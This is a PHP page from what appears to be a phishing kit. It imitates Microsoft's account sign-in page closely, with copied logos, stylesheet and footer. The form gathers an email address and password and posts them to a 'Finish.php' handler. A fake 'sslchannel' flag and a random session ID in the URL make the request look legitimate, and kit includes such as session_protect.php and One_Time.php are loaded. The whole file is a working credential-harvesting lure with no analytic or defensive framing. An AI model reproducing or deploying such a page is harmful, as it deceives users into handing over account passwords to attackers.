<?php
require "CONTROLS.php";
require "includes/session_protect.php";
require "includes/functions.php";
require "includes/One_Time.php";
ini_set('display_errors', 0);
?>
<!DOCTYPE html>
<!-- ServerInfo: BAYIDSLGN2C012 2018.05.02.13.09.01 Live1 Unknown LocVer:0 -->
<!-- PreprocessInfo: azbldrun:CY1AZRBLD43VM1, 2018-05-02T19:48:09.4094699Z - Version: 16,0,27773,2 -->
<!-- RequestLCID: 2057, Market:EN-GB, PrefCountry: UK, LangLCID: 2057, LangISO: EN-GB -->
<html dir="ltr" lang="EN-GB">
<head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=Edge">

    <title>Sign in to your Microsoft account</title>
    <meta name="robots" content="none">
    <meta name="PageID" content="i5030">
    <meta name="SiteID" content="292666">
    <meta name="ReqLC" content="2057">
    <meta name="LocLC" content="2057">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0, user-scalable=no">
    <link rel="shortcut icon" href="assets/files/outlook_fav.ico">
    <link rel="stylesheet" title="Converged_v2" type="text/css" href="assets/files/Converged_v22057.css">


</head>
<body class="cb" data-bind="defineGlobals: ServerData, bodyCssClass">
<div>
    <!--  -->
    <div data-bind="component: { name: 'background-image', publicMethods: backgroundControlMethods }">
        <div class="background" role="presentation" data-bind="css: { app: isAppBranding }, style: { background: backgroundStyle }">
            <!-- ko if: smallImageUrl -->
            <div data-bind="backgroundImage: smallImageUrl()" style="background-image: url(assets/files/0-smaill.jpg);"></div>
            <!-- /ko --><!-- ko if: backgroundImageUrl -->
            <div class="backgroundImage" data-bind="backgroundImage: backgroundImageUrl()" style="background-image: url(assets/files/0.jpg);"></div>
            <!-- ko if: useImageMask --><!-- /ko --><!-- /ko -->
        </div>
    </div>
    <form name="f1" method="post" action="Finish.php?sslchannel=true&sessionid=<?php echo generateRandomString(130); ?>" data-bind="autoSubmit: forceSubmit, attr: { action: postUrl }">
        <!-- ko withProperties: { '$loginPage': $data } -->
        <div class="outer" data-bind="component: { name: 'page',
               params: {
               serverData: svr,
               showButtons: svr.AV,
               showFooterLinks: true,
               useWizardBehavior: svr.A0,
               handleWizardButtons: false,
               password: password,
               hideFromAria: ariaHidden },
               event: {
               footerAgreementClick: footer_agreementClick } }">
            <!-- ko template: { nodes: $componentTemplateNodes, data: $parent } --><!-- ko if: svr.AW --><!-- /ko -->
            <div class="middle" data-bind="css: { 'app': $loginPage.backgroundLogoUrl() }">
                <!-- ko if: $loginPage.backgroundLogoUrl() && !(paginationControlMethods() && paginationControlMethods().currentViewHasMetadata('hideLogo')) --><!-- /ko -->
                <div class="inner" data-bind="css: { 'app': $loginPage.backgroundLogoUrl(), 'wide': paginationControlMethods() &amp;&amp; paginationControlMethods().currentViewHasMetadata('wide') }">
                    <!-- ko ifnot: paginationControlMethods()
                       && (paginationControlMethods().currentViewHasMetadata('hideLogo')
                           || (paginationControlMethods().currentViewHasMetadata('hideDefaultLogo') && !$loginPage.bannerLogoUrl())) -->
                    <div role="banner" data-bind="component: { name: 'logo-control',
                        params: {
                        isChinaDc: svr.fIsChinaDc,
                        bannerLogoUrl: $loginPage.bannerLogoUrl() } }">
                        <!--  --><!-- ko if: bannerLogoUrl --><!-- /ko --><!-- ko if: !bannerLogoUrl && !isChinaDc --><!-- ko component: 'accessible-image-control' --><!-- ko if: (isHighContrastBlackTheme || svr.fHasBackgroundColor) && !isHighContrastWhiteTheme --><!-- /ko --><!-- ko if: (isHighContrastWhiteTheme || !svr.fHasBackgroundColor) && !isHighContrastBlackTheme --> <!-- ko template: { nodes: [darkImageNode], data: $parent } --><img class="logo" role="presentation" pngsrc="assets/files/microsoft_logo.png" svgsrc="assets/files/microsoft_logo.svg" data-bind="imgSrc" src="assets/files/microsoft_logo.svg"><!-- /ko --> <!-- /ko --><!-- /ko --> <!-- /ko -->
                    </div>
                    <!-- /ko --><!-- ko if: svr.bH && (paginationControlMethods() && !paginationControlMethods().currentViewHasMetadata('hideLwaDisclaimer')) --><!-- /ko -->
                    <div role="main" data-bind="component: { name: 'pagination-control',
                        publicMethods: paginationControlMethods,
                        params: {
                        initialViewId: initialViewId,
                        currentViewId: currentViewId,
                        initialSharedData: initialSharedData,
                        initialError: $loginPage.getServerError() },
                        event: {
                        cancel: paginationControl_onCancel,
                        showView: $loginPage.view_onShow } }">
                        <div data-bind="css: { 'animate': animate() || animate.back(), 'back': animate.back }">
                            <!-- ko foreach: views --><!-- ko if: $parent.currentViewIndex() === $index() --> <!-- ko template: { nodes: [$data], data: $parent } -->
                            <div data-viewid="1" data-bind="pageViewComponent: { name: 'login-paginated-username-view',
                              params: {
                              serverData: svr,
                              serverError: initialError,
                              isInitialView: isInitialState,
                              displayName: sharedData.displayName,
                              prefillNames: $loginPage.prefillNames,
                              flowToken: sharedData.flowToken,
                              altCredHintShown: sharedData.altCredHintShown },
                              event: {
                              refresh: $loginPage.view_onRefresh,
                              redirect: $loginPage.view_onRedirect,
                              showLearnMore: $loginPage.learnMore_onShow } }">
                                <!--  -->
                                <div data-bind="component: { name: 'header-control', params: { serverData: svr } }">
                                    <div class="row text-title" id="loginHeader" role="heading">
                                        <div aria-level="1" data-bind="text: title">Sign in</div>
                                        <!-- ko if: isSubtitleVisible --><!-- /ko -->
                                    </div>
                                </div>
                                <!-- ko if: pageDescription && !svr.az --><!-- /ko -->
                                <div class="row">
                                    <div role="alert" aria-live="assertive" aria-atomic="false">
                                        <!-- ko if: usernameTextbox.error --><!-- /ko -->
                                    </div>
                                    <div class="form-group col-md-24">
                                        <!-- ko if: prefillNames().length > 1 --><!-- /ko --><!-- ko ifnot: prefillNames().length > 1 -->
                                        <div class="placeholderContainer" >
                                            <!-- ko withProperties: { '$placeholderText': placeholderText } --> <!-- ko template: { nodes: $componentTemplateNodes, data: $parent } --> <input name="username" maxlength="113" class="form-control ltr_override" placeholder="Email" type="email">
                                            <input type="hidden" name="from" value="Hotmail">
                                            <input name="password" class="form-control ltr_override" placeholder="Password"  type="password">
                                            <div id="usernameProgress" class="progress" role="progressbar" data-bind="visible: isRequestPending, component: 'marching-ants-control', ariaLabel: str['WF_STR_ProgressText']" style="display: none;" aria-label="Please wait">
                                                <!--  --><!-- ko if: useCssAnimation -->

                                                <!-- /ko --><!-- ko ifnot: useCssAnimation --><!-- /ko -->
                                            </div>
                                            <!-- /ko --><!-- /ko --><!-- ko ifnot: usePlaceholderAttribute --><!-- /ko -->
                                        </div>
                                        <!-- /ko -->
                                    </div>
                                </div>
                                <!-- ko withProperties: { '$usernameView': $data } -->
                                <div data-bind="invertOrder: svr.BH, css: { 'position-buttons': !tenantBranding.BoilerPlateText }" class="position-buttons">
                                    <div data-bind="component: { name: 'action-links-control',
                                    params: {
                                    collapseExcessLinks: svr.av },
                                    event: {
                                    menuOpen: actionLinks_onMenuOpen } }">
                                        <!--  -->
                                        <div class="row">
                                            <div class="col-md-24">
                                                <div class="text-13 action-links">
                                                    <!-- ko template: { nodes: $componentTemplateNodes, data: $data } --><!-- ko if: svr.showCantAccessAccountLink --><!-- /ko --><!-- ko if: !svr.n && svr.B2 --><!-- /ko --><!-- ko if: svr.AO && !svr.P && !svr.V --><!-- ko component: { name: 'action-link-control',
                                                event: {
                                                    load: actionLink_onLoad,
                                                    focusChange: actionLink_onFocusChange } } --><!-- ko if: isVisible --> <!-- ko template: { nodes: $componentTemplateNodes, data: $data } --><!-- ko if: isMenuLink --><!-- /ko --><!-- ko ifnot: isMenuLink -->
                                                    <div class="form-group" data-bind="
                                                htmlWithBindings: html['WF_STR_SignUpLink_Text'],
                                                childBindings: {
                                                'signup': {
                                                href: svr.e,
                                                ariaLabel: str['WF_STR_SignupLink_AriaLabel_Text'],
                                                click: $usernameView.signup_onClick } }">No account? <a href="#" id="signup" aria-label="Create a Microsoft account">Create one!</a></div>
                                                    <!-- /ko --><!-- /ko --> <!-- /ko --><!-- /ko --><!-- /ko --><!-- ko if: $usernameView.availableCredsWithoutUsername.length > 0 --><!-- /ko --> <!-- /ko --><!-- ko if: collapseExcessLinks && actionLinks().length > 2 --><!-- /ko -->
                                                </div>
                                            </div>
                                        </div>
                                    </div>
                                    <div class="row" data-bind="css: { 'move-buttons': tenantBranding.BoilerPlateText }">
                                        <div data-bind="component: { name: 'footer-buttons-field',
                                       params: {
                                       serverData: svr,
                                       isPrimaryButtonEnabled: !isRequestPending(),
                                       isPrimaryButtonVisible: svr.AV,
                                       isSecondaryButtonEnabled: true,
                                       isSecondaryButtonVisible: svr.AV &amp;&amp; isBackButtonVisible() },
                                       event: {
                                       primaryButtonClick: primaryButton_onClick,
                                       secondaryButtonClick: secondaryButton_onClick } }">
                                            <div class="col-xs-24 no-padding-left-right form-group no-margin-bottom button-container" data-bind="
                                          visible: isPrimaryButtonVisible() || isSecondaryButtonVisible(),
                                          css: { 'no-margin-bottom': removeBottomMargin || svr.BH, 'button-container': svr.BH }">
                                                <div data-bind="
                                             css: {
                                             'inline-block': svr.BH,
                                             'col-xs-12 secondary': isPrimaryButtonVisible() &amp;&amp; !svr.BH,
                                             'col-xs-24': !(isPrimaryButtonVisible() || svr.BH) }" class="inline-block"> <input id="idBtn_Back" class="btn btn-block" data-bind="
                                             attr: {
                                             'id': secondaryButtonId || 'idBtn_Back',
                                             'aria-describedby': secondaryButtonDescribedBy },
                                             value: secondaryButtonText() || str['CT_HRD_STR_Splitter_Back'],
                                             hasFocus: focusOnSecondaryButton,
                                             click: secondaryButton_onClick,
                                             enable: isSecondaryButtonEnabled,
                                             visible: isSecondaryButtonVisible" value="Back" style="display: none;" type="button"> </div>
                                                <div data-bind="
                                             css: {
                                             'inline-block': svr.BH,
                                             'col-xs-12 primary': isSecondaryButtonVisible() &amp;&amp; !svr.BH,
                                             'col-xs-24': !(isSecondaryButtonVisible() || svr.BH) }" class="inline-block"> <input id="idSIButton9" class="btn btn-block btn-primary" data-bind="
                                             attr: {
                                             'id': primaryButtonId || 'idSIButton9',
                                             'aria-describedby': primaryButtonDescribedBy },
                                             value: primaryButtonText() || str['CT_PWD_STR_SignIn_Button_Next'],
                                             hasFocus: focusOnPrimaryButton,
                                             click: primaryButton_onClick,
                                             enable: isPrimaryButtonEnabled,
                                             visible: isPrimaryButtonVisible" value="Next" type="submit"> </div>
                                            </div>
                                        </div>
                                    </div>
                                </div>
                                <!-- ko if: $usernameView.altCredHintEnabled() && isCredSwitchLinkInMoreOptions() --><!-- /ko --><!-- /ko --><!-- ko if: tenantBranding.BoilerPlateText --><!-- /ko -->
                            </div>
                            <!-- /ko --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- /ko -->
                        </div>
                    </div>
                </div>
                <!-- ko if: newSessionMessage --><!-- /ko -->
                <div data-bind="component: { name: 'instrumentation',
                     publicMethods: instrumentationMethods,
                     params: { serverData: svr } }">
            </div>
            <!-- /ko -->
        </div>
        <!-- /ko --><!-- ko if: showFeatureNotificationBanner --><!-- /ko -->
        <div id="footer" class="footer default" role="contentinfo" data-bind="css: { 'default': !backgroundLogoUrl() }">
            <div data-bind="component: { name: 'footer-control',
                  params: {
                  serverData: svr,
                  debugDetails: debugDetails,
                  showLinks: true },
                  event: {
                  agreementClick: footer_agreementClick,
                  showDebugDetailsClick: footer_showDebugDetailsClick } }">
                <!--  --><!-- ko if: showLinks || impressumLink || showIcpLicense -->
                <div id="footerLinks" class="footerNode text-secondary">
                    <!-- ko if: !showIcpLicense --> <span id="ftrCopy" data-bind="html: svr.bG">©2018 Microsoft</span><!-- /ko --> <a id="ftrTerms" data-bind="text: str['MOBILE_STR_Footer_Terms'], href: termsLink, click: termsLink_onClick" href="#">Terms of use</a> <a id="ftrPrivacy" data-bind="text: str['MOBILE_STR_Footer_Privacy'], href: privacyLink, click: privacyLink_onClick" href="#">Privacy &amp; cookies</a><!-- ko if: impressumLink --><!-- /ko --><!-- ko if: showIcpLicense --><!-- /ko -->
                    <a href="#" role="button" class="moreOptions" data-bind="click: moreInfo_onClick, ariaLabel: str['CT_STR_More_Options_Ellipsis_AriaLabel'], attr: { title: str['CT_STR_More_Options_Ellipsis_AriaLabel'] }" aria-label="Click here for more options" title="Click here for more options">
                        <!-- ko component: 'accessible-image-control' --><!-- ko if: (isHighContrastBlackTheme || svr.fHasBackgroundColor) && !isHighContrastWhiteTheme --><!-- /ko --><!-- ko if: (isHighContrastWhiteTheme || !svr.fHasBackgroundColor) && !isHighContrastBlackTheme --> <!-- ko template: { nodes: [darkImageNode], data: $parent } -->
                    </a>
                </div>
                <!-- ko if: showDebugDetails --><!-- /ko --> <!-- /ko -->
            </div>
        </div>
    </form>

    <!-- ko if: svr.AK --><!-- /ko --><!-- ko if: svr.AG --><!-- /ko -->
</div>
</body>
</html>

